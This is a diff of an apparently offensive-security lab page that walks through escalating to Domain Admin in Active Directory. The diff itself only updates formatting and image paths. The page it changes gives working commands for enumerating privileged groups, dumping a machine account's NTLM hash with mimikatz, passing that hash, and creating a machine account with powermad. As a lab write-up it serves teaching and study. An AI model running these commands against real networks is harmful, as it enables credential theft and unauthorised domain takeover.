@@ -8,37 +8,37 @@ This labs is based on an assumption that you have gained local administrator pri
 
 Finding domain computers that are members of interesting groups:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-29-16-03-19.png)
 
 Of course, the same can be observed by simply checking the Domain Admins net group:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 net group "domain admins" /domain
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-29-17-22-59.png)
 
 or administrators group \(not applicable to our lab, but showing as a sidenote\):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 net localgroup administrators /domain
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-29-17-24-07.png)
 
@@ -48,13 +48,13 @@ In AD, the highlighted part can be seen here:
 
 Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 sekurlsa::logonPasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-29-15-29-17.png)
 
@@ -64,13 +64,13 @@ Let's check that our current compromised user `ws01\mantvydas` \(local admin on 
 
 Since WS01$ machine is a member of `Domain Admins` and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-29-15-52-35.png)
 
@@ -88,7 +88,7 @@ Let's create a new machine account with powermad like so:
 New-MachineAccount -MachineAccount testmachine
 ```
 
-![](../../.gitbook/assets/image%20%28199%29.png)
+![](../../.gitbook/assets/image%20%28202%29.png)
 
 Now, let's say someone added the testmachine$ account into Domain Admins:
 
@@ -96,7 +96,7 @@ Now, let's say someone added the testmachine$ account into Domain Admins:
 Get-NetGroupMember "domain admins" | select membern*
 ```
 
-![](../../.gitbook/assets/image%20%28158%29.png)
+![](../../.gitbook/assets/image%20%28159%29.png)
 
 ...if we somehow get hold of the testmachine$ password, we can escalate to a DA. We can check this by opening a new console and logging in as testmachine$ with `/netonly` flag. Note how initially the user spotless cannot list files on the DC01, but once `runas /user:testmachine$ /netonly powershell` is run and the password is provided, DC01 is no longer complaining and allows spotless listing its file system:
 
